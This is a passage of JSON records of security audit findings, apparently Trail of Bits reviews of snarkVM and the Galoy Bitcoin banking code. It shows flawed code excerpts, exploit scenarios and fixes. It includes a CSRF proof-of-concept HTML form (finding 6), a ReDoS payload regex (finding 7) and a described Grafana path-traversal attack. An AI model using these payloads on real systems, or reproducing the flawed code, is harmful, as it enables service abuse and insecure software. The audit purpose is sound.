        "description": "During function and closure parsing, the compiler collects input, regular, and output instructions into three dierent IndexSet s in the add_input , add_instruction , and add_output functions. All of these functions check that the current number of elements in their respective IndexSet does not exceed the maximum allowed number. However, the check is done before inserting the element in the set, allowing inserting in a set that is already at full capacity and creating a set with one element more than the maximum. Figure 21.1 shows the comparison between the current and the maximum number of allowed elements and the subsequent insertion, which is allowed even though the set could already be at full capacity. All add_input , add_instruction , and add_output functions for both the Function and Closure types present similar behavior. Note that although the number of input and output instructions is checked in other locations (e.g., on the add_closure or get_closure functions), the number of regular instructions is not checked there, allowing a function or a closure with 1 + N::MAX_INSTRUCTIONS . fn add_output (& mut self , output: Output <N>) -> Result <()> { // Ensure there are input statements and instructions in memory. ensure!(! self .inputs.is_empty(), \"Cannot add outputs before inputs have been added\" ); ensure!(! self .instructions.is_empty(), \"Cannot add outputs before instructions have been added\" ); // Ensure the maximum number of outputs has not been exceeded. ensure!( self .outputs.len() <= N::MAX_OUTPUTS , \"Cannot add more than {} outputs\" , N::MAX_OUTPUTS); // Insert the output statement. self .outputs.insert(output); Ok (()) } Figure 21.1: vm/compiler/src/program/function/mod.rs#L142-L153 Figure 21.1 shows another issue present only in the add_output functions (for both Function and Closure types): When an output instruction is inserted into the set, no check validates if this particular element is already in the set, replacing the previous element with the same key if present. This causes two output statements to be interpreted as a single one: program main.aleo; closure clo: input r0 as i8; input r1 as u8; pow r0 r1 into r2; output r2 as i8; output r2 as i8; function compute: input r0 as i8.private; input r1 as u8.public; call clo r0 r1 into r2 ; output r2 as i8.private; Figure 21.2: Test program Recommendations Short term, we recommend the following actions:    Modify the checks to validate the maximum number of allowed instructions to prevent the o-by-one error. Validate if outputs are already present in the Function and Closure sets before inserting an output. Add checks to validate the maximum number of instructions in the get_closure , get_function , add_closure , and add_function functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Instances of unchecked zip_eq can cause runtime errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The zip_eq operator requires that both iterators being zipped have the same length, and panics if they do not. In addition to the cases presented in TOB-ALEOA-5 , we found one more instance where this should be checked: // Retrieve the interface and ensure it is defined in the program. let interface = stack.program().get_interface(&interface_name)?; // Initialize the interface members. let mut members = IndexMap::new(); for (member, (member_name, member_type)) in inputs.iter(). zip_eq (interface.members()) { Figure 22.1: compiler/src/program/instruction/operation/cast.rs#L92-L99 Additionally, we found uses of the zip operator that should be replaced by zip_eq , together with an associated check to validate the equal length of their iterators: /// Checks that the given operands matches the layout of the interface. The ordering of the operands matters. pub fn matches_interface (& self , stack: & Stack <N>, operands: & [Operand<N>], interface: & Interface <N>) -> Result <()> { // Ensure the operands is not empty. if operands.is_empty() { bail!( \"Casting to an interface requires at least one operand\" ) } // Ensure the operand types match the interface. for (operand, (_, member_type)) in operands.iter(). zip (interface.members()) { Figure 22.2: vm/compiler/src/process/register_types/matches.rs#L20-L27 for (operand, (_, entry_type)) in operands.iter().skip( 2 ). zip (record_type.entries()) { Figure 22.3: vm/compiler/src/process/register_types/matches.rs#L106-L107 Exploit Scenario An incorrectly typed program causes the compiler to panic due to a mismatch between the number of arguments in a cast and the number of elements in the casted type. Recommendations Short term, add checks to validate the equal length of the iterators being zipped and replace the uses of zip with zip_eq together with the associated length validations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "23. Hash functions lack domain separation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The BHP hash function takes as input a collection of booleans, and hashes them. This hash is used to commit to a Record , hashing together the bits of program_id , the record_name , and the record itself. However, no domain separation or input length is added to the hash, allowing a hash collision if a types to_bits_le function returns variable-length arrays: impl <N: Network > Record<N, Plaintext<N>> { /// Returns the record commitment. pub fn to_commitment (& self , program_id: & ProgramID <N>, record_name: & Identifier <N>) -> Result <Field<N>> { // Construct the input as `(program_id || record_name || record)`. let mut input = program_id.to_bits_le(); input.extend(record_name.to_bits_le()); input.extend( self .to_bits_le()); // Compute the BHP hash of the program record. N::hash_bhp1024(&input) } } Figure 23.1: console/program/src/data/record/to_commitment.rs#L19-L29 A similar situation is present on the hash_children function, which is used to compute hashes of two nodes in a Merkle tree: impl <E: Environment , const NUM_WINDOWS: u8 , const WINDOW_SIZE: u8 > PathHash for BHP<E, NUM_WINDOWS, WINDOW_SIZE> { type Hash = Field<E>; /// Returns the hash of the given child nodes. fn hash_children (& self , left: & Self ::Hash, right: & Self ::Hash) -> Result < Self ::Hash> { // Prepend the nodes with a `true` bit. let mut input = vec! [ true ]; input.extend(left.to_bits_le()); input.extend(right.to_bits_le()); // Hash the input. Hash::hash( self , &input) } } Figure 23.2: circuit/collections/src/merkle_tree/helpers/path_hash.rs#L33-L47 If the implementations of the to_bits_le functions return variable length arrays, it would be easy to create two dierent inputs that would result in the same hash. Recommendations Short term, either enforce each types to_bits_le function to always be xed length or add the input length and domain separators to the elements to be hashed by the BHP hash function. This would prevent the hash collisions even if the to_bits_le functions were changed in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "24. Deployment constructor does not enforce the network edition value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The Deployment type includes the edition value, which should match the network edition value. However, this is not enforced in the deployment constructor as it is in the Execution constructor. impl <N: Network > Deployment<N> { /// Initializes a new deployment. pub fn new ( edition: u16 , program: Program <N>, verifying_keys: IndexMap <Identifier<N>, (VerifyingKey<N>, Certificate<N>)>, ) -> Result < Self > { Ok ( Self { edition, program, verifying_keys }) } } Figure 24.1: vm/compiler/src/process/deployment/mod.rs#L37-L44 Recommendations Short term, consider using the N::EDITION value in the Deployment constructor, similarly to the Execution constructor.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Map insertion return value is ignored ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "Some insertions into hashmap data types ignore whether the insertion overwrote an element already present in the hash map. For example, when handling the proving and verifying key index maps, the Optional return value from the insert function is ignored: #[inline] pub fn insert_proving_key (& self , function_name: & Identifier <N>, proving_key: ProvingKey <N>) { self .proving_keys.write().insert(*function_name, proving_key); } /// Inserts the given verifying key for the given function name. #[inline] pub fn insert_verifying_key (& self , function_name: & Identifier <N>, verifying_key: VerifyingKey <N>) { self .verifying_keys.write().insert(*function_name, verifying_key); } Figure 25.1: vm/compiler/src/process/stack/mod.rs#L336-L346 Other examples of ignored insertion return values are present in the codebase and can be found using the regular expression  \\.insert.*\\); . Recommendations Short term, investigate if any of the unguarded map insertions should be checked.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "26. Potential truncation on reading and writing Programs, Deployments, and Executions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "When writing a Program to bytes, the number of import statements and identiers are casted to an u8 integer, leading to the truncation of elements if there are more than 256 identiers: // Write the number of program imports. ( self .imports.len() as u8 ).write_le(& mut writer)?; // Write the program imports. for import in self .imports.values() { import.write_le(& mut writer)?; } // Write the number of components. ( self .identifiers.len() as u8 ).write_le(& mut writer)?; Figure 26.1: vm/compiler/src/program/bytes.rs#L73-L81 During Program parsing, this limit of 256 identiers is never enforced. Similarly, the Execution and Deployment write_le functions assume that there are fewer than u16::MAX transitions and verifying keys, respectively. // Write the number of transitions. ( self .transitions.len() as u16 ).write_le(& mut writer)?; Figure 26.2: vm/compiler/src/process/execution/bytes.rs#L52-L53 // Write the number of entries in the bundle. ( self .verifying_keys.len() as u16 ).write_le(& mut writer)?; Figure 26.3: vm/compiler/src/process/deployment/bytes.rs#L62-L63 Recommendations Short term, determine a maximum number of allowed import statements and identiers and enforce this bound on Program parsing. Then, guarantee that the integer type used in the write_le function includes this bound. Perform the same analysis for the Execution and Deployment functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "27. StatePath::verify accepts invalid states ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The StatePath::verify function attempts to validate several properties in the transaction using the code shown in gure 28.1. However, this code does not actually check that all checks are true; it checks only that there are an even number of false booleans. Since there are six booleans in the operation, the function will return true if all are false. // Ensure the block path is valid. let check_block_hash = A::hash_bhp1024(&block_hash_preimage).is_equal(& self .block_hash); // Ensure the state root is correct. let check_state_root = A::verify_merkle_path_bhp(& self .block_path, & self .state_root, & self .block_hash.to_bits_le()); check_transition_path .is_equal(&check_transaction_path) .is_equal(&check_transactions_path) .is_equal(&check_header_path) .is_equal(&check_block_hash) .is_equal(&check_state_root) } Figure 27.1: vm/compiler/src/ledger/state_path/circuit/verify.rs#L57-L70 We marked the severity as informational since the function is still not being used. Exploit Scenario An attacker submits a StatePath where no checks hold, but the verify function still returns true. Recommendations Short term, ensure that all checks are true (e.g., by conjuncting all booleans and checking that the resulting boolean is true).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "28. Potential panic in encryption/decryption circuit generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The decrypt_with_randomizers and encrypt_with_randomizers functions do not check the length of the randomizers argument against the length of the underlying ciphertext and plaintext, respectively. This can cause a panic in the zip_eq call. Existing calls to the function seem safe, but since it is a public function, the lengths of its underlying values should be checked to prevent panics in future code. pub ( crate ) fn decrypt_with_randomizers (& self , randomizers: & [Field<A>]) -> Plaintext <A> { // Decrypt the ciphertext. Plaintext::from_fields( & self .iter() .zip_eq(randomizers) Figure 28.1: circuit/program/src/data/ciphertext/decrypt.rs#L31-L36 Recommendations Short term, add a check to ensure that the length of the underlying plaintext/ciphertext matches the length of the randomizer values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Variable timing of certain cryptographic functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The Pedersen commitment code computes the masking element [r]h by ltering out powers of h not indicated by the randomizer r and adding the remaining values. However, the timing of this function leaks information about the randomizer value. In particular, it can reveal the Hamming weight (or approximate Hamming weight) of the randomizer. If the randomizer r is a 256-bit value, but timing indicates that the randomizer has a Hamming weight of 100 (for instance), then the possible set of randomizers has only about 2 243 elements. This compromises the information-theoretic security of the hiding property of the Pedersen commitment. randomizer.to_bits_le().iter().zip_eq(&* self .random_base_window).filter(|(bit, _)| **bit).for_each( |(_, base)| { output += base; }, ); Figure 29.1: console/algorithms/src/pedersen/commit_uncompressed.rs#L27-L33 Recommendations Short term, consider switching to a constant-time algorithm for computing the masking value.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Insecure download process for the yq tool ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Dockerle uses the Wget utility to download the yq tool but does not verify the le it has downloaded by its checksum or signature. Without verication, an archive that has been corrupted or modied by a malicious third party may not be detected. Figures 1.1 and 1.2 show cases in which a tool is downloaded without verication of its checksum. 6 RUN wget https://github.com/mikefarah/yq /releases/download/v4.17.2/yq_linux_386.tar.gz -O - | \\ 7 tar xz && mv yq_linux_386 /usr/bin/yq Figure 1.1: The Dockerle downloads and unarchives the yq tool. ( ci/image/Dockerfile#67 ) 41 wget https://github.com/bodymindarts/cepler /releases/download/v ${ cepler_version } /cepler-x 86_64-unknown-linux-musl- ${ cepler_version } .tar.gz \\ 42 && tar -zxvf cepler-x86_64-unknown-linux-musl- ${ cepler_version } .tar.gz \\ 43 && mv cepler-x86_64-unknown-linux-musl- ${ cepler_version } /cepler /usr/local/bin \\ 44 && chmod +x /usr/local/bin/cepler \\ 45 && rm -rf ./cepler-* Figure 1.2: The bastion-startup script downloads and unarchives the cepler tool. ( modules/inception/gcp/bastion-startup.tmpl#4145 ) Exploit Scenario An attacker gains access to the GitHub repository from which yq is downloaded. The attacker then modies the binary to create a reverse shell upon yq s startup. When a user runs the Dockerle, the attacker gains access to the users container. Recommendations Short term, have the Dockerle and other scripts in the solution verify each le they download by its checksum . Long term, implement checks to ensure the integrity of all third-party components used in the solution and periodically check that all components are downloaded from encrypted URLs.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Use of unencrypted HTTP scheme ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy ipfetcher module uses the unencrypted HTTP scheme (gure 2.1). As a result, an attacker in the same network as the host invoking the code in gure 2.1 could intercept and modify both the request and ipfetcher s response to it, potentially accessing sensitive information. 8 9 const { data } = await axios.get( ` http ://proxycheck.io/v2/ ${ ip } ?key= ${ PROXY_CHECK_APIKEY } &vpn=1&asn=1` , 10 ) Figure 2.1: src/services/ipfetcher/index.ts#810 Exploit Scenario Eve gains access to Alices network and obtains Alices PROXY_CHECK_APIKEY by observing the unencrypted network trac. Recommendations Short term, change the URL scheme used in the ipfetcher service to HTTPS. Long term, use tools such as WebStorm code inspections to nd other uses of unencrypted URLs.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of expiration and revocation mechanism for JWTs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy system uses JSON web tokens (JWTs) for authentication. A user obtains a new JWT by calling the userLogin GraphQL mutation. Once a token has been signed, it is valid forever; the platform does not set an expiration time for tokens and cannot revoke them. 7 export const createToken = ({ 8 uid, 9 network, 10 }: { 11 uid: UserId 12 network: BtcNetwork 13 }): JwtToken => { 14 return jwt.sign({ uid, network }, JWT_SECRET, { // (...) 25 algorithm: \"HS256\" , 26 }) as JwtToken 27 } Figure 3.1: The creation of a JWT ( src/services/jwt.ts#727 ) Exploit Scenario An attacker obtains a users JWT and gains persistent access to the system. The attacker then engages in destructive behavior. The victim eventually notices the behavior but does not have a way to stop it. Recommendations Short term, consider setting an expiration time for JWTs, and implement a mechanism for revoking tokens. That way, if a JWT is leaked, an attacker will not gain persistent access to the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Use of insecure function to generate phone codes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy application generates a verication code by using the JavaScript function Math.random() , which is not a cryptographically secure pseudorandom number generator (CSPRNG) . const randomIntFromInterval = (min, max) => Math .floor( Math .random() * (max - min + 1 ) + min) 10 11 12 // (...) 82 83 84 85 86 87 const code = String ( randomIntFromInterval( 100000 , 999999 ) ) as PhoneCode const galoyInstanceName = getGaloyInstanceName() const body = ` ${ code } is your verification code for ${ galoyInstanceName } ` const result = await PhoneCodesRepository().persistNew({ 88 phone: phoneNumberValid , 89 code, 90 }) 91 92 93 94 95 96 } if (result instanceof Error ) return result const sendTextArguments = { body, to: phoneNumberValid , logger } return TwilioClient().sendText(sendTextArguments) Figure 4.1: src/app/users/request-phone-code.ts#1096 Exploit Scenario An attacker repeatedly generates verication codes and analyzes the values and the order of their generation. The attacker attempts to deduce the pseudorandom number generator's internal state. If successful, the attacker can then perform an oine calculation to predict future verication codes. Recommendations Short term, replace Math.random() with a CSPRNG. Long term, always use a CSPRNG to generate random values for cryptographic operations.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Redundant basic authentication method ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy application implements a basic authentication method (gure 5.1) that is redundant because the apiKey is not being used. Superuous authentication methods create new attack vectors and should be removed from the codebase. 1 2 3 import express from \"express\" const formatError = new Error ( \"Format is Authorization: Basic <base64(key:secret)>\" ) 4 5 export default async function ( 6 req: express.Request , 7 _res: express.Response , 8 next: express.NextFunction , 9 ) { 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 const authorization = req.headers[ \"authorization\" ] if (!authorization) return next() const parts = authorization.split( \" \" ) if (parts.length !== 2 ) return next() const scheme = parts[ 0 ] if (! /Basic/i .test(scheme)) return next() const credentials = Buffer. from (parts[ 1 ], \"base64\" ).toString().split( \":\" ) if (credentials.length !== 2 ) return next(formatError) const [apiKey, apiSecret] = credentials if (!apiKey || !apiSecret) return next(formatError) 25 req[ \"apiKey\" ] = apiKey 26 req[ \"apiSecret\" ] = apiSecret 27 next() 28 } Figure 5.1: The basic authentication method implementation ( src/servers/middlewares/api-key-auth.ts#128 ) Recommendations Short term, remove the apiKey -related code. Long term, review and clearly document the Galoy authentication methods.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. GraphQL queries may facilitate CSRF attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy applications /graphql endpoint handles queries sent via GET requests. It is impossible to pass state-changing mutations or subscriptions in GET requests, and authorized queries need the Authorization: Bearer header. However, if a state-changing GraphQL operation were mislabeled as a query (typically a non-state-changing request), the endpoint would be vulnerable to cross-site request forgery (CSRF) attacks. Exploit Scenario An attacker creates a malicious website with JavaScript code that sends requests to the /graphql endpoint (gure 6.1). When a user visits the website, the JavaScript code is executed in the users browser, changing the servers state. <html> <body> <script> history.pushState('', '', '/') </script> <form action= \"http://192.168.236.135:4002/graphql\" > <input type= \"hidden\" name= \"query\" value= \"query&#32;&#123;&#10;&#9;btcPriceList&#40;range&#58;ONE&#95;MONTH&#41;&#32;&# 123;&#10;&#9;&#9;price&#32;&#123;&#10;&#9;&#9;&#9;offset&#10;&#9;&#9;&#125;&#10;&#9; &#9;timestamp&#10;&#9;&#125;&#10;&#125;\" /> <input type= \"submit\" value= \"Submit request\" /> </form> </body> </html> Figure 6.1: In this proof-of-concept CSRF attack, the malicious website sends a request (the btcPriceList query) when the victim clicks Submit request. Recommendations Short term, disallow the use of the GET method to send queries, or enhance the CSRF protections for GET requests. Long term, identify all state-changing endpoints and ensure that they are protected by an authentication or anti-CSRF mechanism. Then implement tests for those endpoints. References   Cross-Origin Resource Sharing, Mozilla documentation Cross-Site Request Forgery Prevention, OWASP Cheat Sheet Series",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Potential ReDoS risk ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The caseInsensitiveRegex function takes an input: string parameter and uses it to create a new RegExp object (gure 7.1). Users cannot currently control the input parameter (the regular expression) or the string; however, if users gain that ability as the code is developed, it may enable them to cause a regular expression denial of service (ReDoS) . 13 14 export const caseInsensitiveRegex = (input: string ) => { return new RegExp ( `^ ${ input } $` , \"i\" ) 15 } Figure 7.1: src/services/mongoose/users.ts#1315 37 const findByUsername = async ( 38 username: Username , 39 ): Promise<Account | RepositoryError> => { 40 41 try { const result = await User.findOne( 42 { username: caseInsensitiveRegex (username) }, Figure 7.2: src/services/mongoose/accounts.ts#3742 Exploit Scenario An attacker registers an account with a specially crafted username (line 2, gure 7.3), which forms part of a regex. The attacker then nds a way to pass the malicious regex (line 1, gure 7.3) to the findByUsername function, causing a denial of service on a victims machine. 1 2 let test = caseInsensitiveRegex( \"(.*){1,32000}[bc]\" ) let s = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\" 3 s.match(test) Figure 7.3: A proof of concept for the ReDoS vulnerability Recommendations Short term, ensure that input passed to the caseInsensitiveRegex function is properly validated and sanitized.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Use of MD5 to generate unique GeeTest identiers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy application uses MD5 hashing to generate a unique identier during GeeTest service registration. MD5 is an insecure hash function and should never be used in a security-relevant context. 33 const register = async (): Promise<UnknownCaptchaError | GeetestRegister> => { 34 35 36 37 try { const gtLib = new GeetestLib(config.id, config.key) const digestmod = \"md5\" const params = { 38 digestmod, 39 client_type: \"native\" , 40 } 41 42 43 const bypasscache = await getBypassStatus() // not a cache let result if (bypasscache === \"success\" ) { 44 result = await gtLib.register(digestmod, params) Figure 8.1: src/services/geetest.ts#3344 Recommendations Short term, change the hash function used in the register function to a stronger algorithm that will not cause collisions, such as SHA-256. Long term, document all cryptographic algorithms used in the system, implement a policy governing their use, and create a plan for when and how to deprecate them.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Reliance on SMS-based OTPs for authentication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Galoys authentication process is heavily reliant on the delivery of one-time passwords (OTPs) over SMS. This authentication method contravenes best practices and should not be used in applications that handle nancial transactions or other sensitive operations. SMS-based OTP leaves users vulnerable to multiple attacks and is considered an unsafe authentication method. Several of the most common and eective attack scenarios are described below.    Text messages received by a mobile device can be intercepted by rogue applications on the device. Many users blindly authorize untrusted third-party applications to access their mobile phones SMS databases; this means that a vulnerability in a third-party application could lead to the compromise and disclosure of the text messages on the device, including Galoys SMS OTP messages. Another common technique used to target mobile nance applications is the interception of notications on a device. Android operating systems, for instance, broadcast notications across applications by design; a rogue application could subscribe to those notications to access incoming text message notications. Attackers also target SMS-based two-factor authentication and OTP implementations through SIM swapping . In short, an attacker uses social engineering to gather information about the owner of a SIM card and then, impersonating its owner, requests a new SIM card from the telecom company. All calls and text messages will then be sent to the attacker, leaving the original owner of the number out of the loop. This approach has been used in many recent attacks against crypto wallet owners, leading to millions of dollars in losses. Recommendations Short term, avoid using SMS authentication as anything other than an optional way to validate an account holder's identity and prole information. Instead of SMS-based OTP, provide support for hardware-based two-factor authentication methods such as Yubikey tokens, or software-based time-based one-time password (TOTP) implementations such as Google Authenticator and Authy. References  What is a Sim Swap? Denition and Related FAQs, Yubico",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Incorrect handling and implementation of SMS OTPs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Users authenticate to the web panel by providing OTPs sent to them over SMS. We identied two issues in the OTP authentication implementation: 1. The generated OTPs are persistent because OTP expiration dates are calculated incorrectly. The Date.now() method returns the epoch time in milliseconds, whereas it is meant to return the time in seconds. 294 const PhoneCodeSchema = new Schema({ 295 created_at: { 296 297 type : Date , default: Date.now , 298 required: true , Figure 10.1: The default date value is expressed in milliseconds. ( src/services/mongoose/schema.ts#294298 ) 11 export const VALIDITY_TIME_CODE = ( 20 * 60 ) as Seconds Figure 10.2: The default validity period is expressed in seconds. ( src/config/index.ts#11 ) 49 50 51 const age = VALIDITY_TIME_CODE const validCode = await isCodeValid({ phone: phoneNumberValid , code, age }) if (validCode instanceof Error ) return validCode Figure 10.3: Validation of an OTPs age ( src/app/users/login.ts#4951 ) 18 }): Promise < true | RepositoryError> => { 19 20 21 const timestamp = Date .now() / 1000 - age try { const phoneCode = await PhoneCode.findOne({ 22 phone, 23 code, 24 created_at: { 25 $gte: timestamp , 26 }, Figure 10.4: The codebase validates the timestamp in seconds, while the default date is in milliseconds, as shown in gure 10.1. ( src/services/mongoose/phone-code.ts#1826 ) 2. The SMS OTPs are never discarded. When a new OTP is sent to a user, the old one remains valid regardless of its expiration time. A users existing OTP tokens also remain valid if the user manually logs out of a session, which should not be the case. Tests of the admin-panel and web-wallet code conrmed that all SMS OTPs generated for a given phone number remain valid in these cases. Exploit Scenario After executing a successful phishing attack against a user, an attacker is able to intercept an OTP sent to that user, gaining persistent access to the victim's account. The attacker will be able to use the code even when the victim logs out of the session or requests a new OTP. Recommendations Short term, limit the lifetime of OTPs to two minutes. Additionally, immediately invalidate an OTP, even an unexpired one, when any of the following events occur:      The user logs out of a session The user requests a new OTP The OTP is used successfully The OTP reaches its expiration time The users account is locked for any reason (e.g., too many login attempts) References  NIST best practices for implementing authentication tokens",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Vulnerable and outdated Node packages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "We used the yarn audit and snyk tools to audit the project dependencies and components for known vulnerabilities and outdated versions, respectively. The project uses many outdated packages with known security vulnerabilities ranging from critical to low severity. A list of vulnerable and outdated packages is included in appendix C . Vulnerabilities in packages imported by an application are not necessarily exploitable. In most cases, an aected method in a vulnerable package needs to be used in the right context to be exploitable. We manually reviewed the packages with high- or critical-severity vulnerabilities and did not nd any vulnerabilities that could be exploited in the Galoy application. However, that could change as the code is further developed. Exploit Scenario An attacker ngerprints one of Galoys components, identies an out-of-date package with a known vulnerability, and uses it in an exploit against the component. Recommendations Short term, update the outdated and vulnerable dependencies. Long term, integrate static analysis tools that can detect outdated and vulnerable libraries (such as the yarn audit and snyk tools) into the build and / or test pipeline. This will improve the system's security posture and help prevent the exploitation of project dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Outdated and internet-exposed Grafana instance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Grafana admin panel is exposed over the internet. A management interface should not be exposed over the internet unless it is protected by a secondary authentication or access control mechanism; these mechanisms (e.g., IP address restrictions and VPN solutions) can mitigate the immediate risk to an application if it experiences a vulnerability. Moreover, the Grafana version deployed at grafana.freecorn.galoy.io is outdated and vulnerable to known security issues. Figure 12.1: The outdated Grafana version (8.2.1) with known security issues The version banner on the login page (gure 12.1) identies the version as v8.2.1 ( 88622d7f09 ). This version has multiple moderate- and high-risk vulnerabilities. One of them, a path traversal vulnerability ( CVE-2021-43798 ), could enable an unauthenticated attacker to read the contents of arbitrary les on the server. However, we could not exploit this issue, and the Galoy team suggested that the code might have been patched through an upstream software deployment. Time constraints prevented us from reviewing all Grafana instances for potential vulnerabilities. We reviewed only the grafana.freecorn.galoy.io instance, but the recommendations in this nding apply to all deployed instances. Exploit Scenario An attacker identies the name of a valid plugin installed and active on the instance. By using a specially crafted URL, the attacker can read the contents of any le on the server (as long as the Grafana process has permission to access the le). This enables the attacker to read sensitive conguration les and to engage in remote command execution on the server. Recommendations Short term, avoid exposing any Grafana instance over the internet, and restrict access to each instances management interface. This will make the remote exploitation of any issues much more challenging. Long term, to avoid known security issues, review all deployed instances and ensure that they have been updated to the latest version. Additionally, review the Grafana log les for any indication of the attack described in CVE-2021-43798, which has been exploited in the wild. References  List of publicly known vulnerabilities aecting recent versions of Grafana",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Incorrect processing of GET path parameter ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "If the value of the hidden path parameter in the GET request in gure 13.1 does not match the value in the appRoutesDef array, the request will cause an unhandled error (gure 13.2). The error occurs when the result of the serverRenderer function is undefined (line 21, gure 13.3), because the Invalid route path error is thrown in the call to the renderToStringWithData function (gure 13.4). GET / ?path=aaaa HTTP / 1.1 Host: localhost:3000 Figure 13.1: The HTTP request that triggers the error HTTP / 1.1 500 Internal Server Error // (...) ReferenceError: /Users/md/work/web-wallet/views/index.ejs:8 6| <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /> 7| >> 8| <title><%- pageData.title %></title> 9| 10| <link rel=\"stylesheet\" href=\"/themes/<%- GwwConfig.walletTheme -%>/colors.css\" /> 11| <link rel=\"stylesheet\" href=\"/bundles/<%- gVars['main'][0] -%>\" /> pageData is not defined at eval (\"web-wallet/views/index.ejs\":12:17) at index (web-wallet/node_modules/ejs/lib/ejs.js:692:17) at tryHandleCache (web-wallet/node_modules/ejs/lib/ejs.js:272:36) at View.exports.renderFile [as engine] (web-wallet/node_modules/ejs/lib/ejs.js:489:10) at View.render (web-wallet/node_modules/express/lib/view.js:135:8) at tryRender (web-wallet/node_modules/express/lib/application.js:640:10) at Function.render (web-wallet/node_modules/express/lib/application.js:592:3) at ServerResponse.render (web-wallet/node_modules/express/lib/response.js:1017:7) at web-wallet/src/server/ssr-router.ts:24:18 </ pre ></ body ></ html > Figure 13.2: The HTTP response that shows the unhandled error 21 22 23 24 const vars = await serverRenderer(req)({ // undefined path: checkedRoutePath , }) return res.render( \"index\" , vars) // call when the vars is undefined Figure 13.3: src/server/ssr-router.ts#2124 10 export const serverRenderer = 11 (req: Request ) => 12 async ({ 13 path, 14 flowData, 15 }: { 16 path: RoutePath | AuthRoutePath 17 flowData?: KratosFlowData 18 }) => { 19 try { // (...) 43 const initialMarkup = await renderToStringWithData(App) // (...) 79 }) 80 } catch (err) { 81 console.error(err) 82 } Figure 13.4: src/renderers/server.tsx#1082 Exploit Scenario An attacker nds a way to inject malicious code into the hidden path parameter. This results in an open redirect vulnerability, enabling the attacker to redirect a victim to a malicious website. Recommendations Short term, ensure that errors caused by an invalid path parameter value (one not included in the appRoutesDef whitelist) are handled correctly. A path parameter should not be processed if it is unused. Long term, use Burp Suite 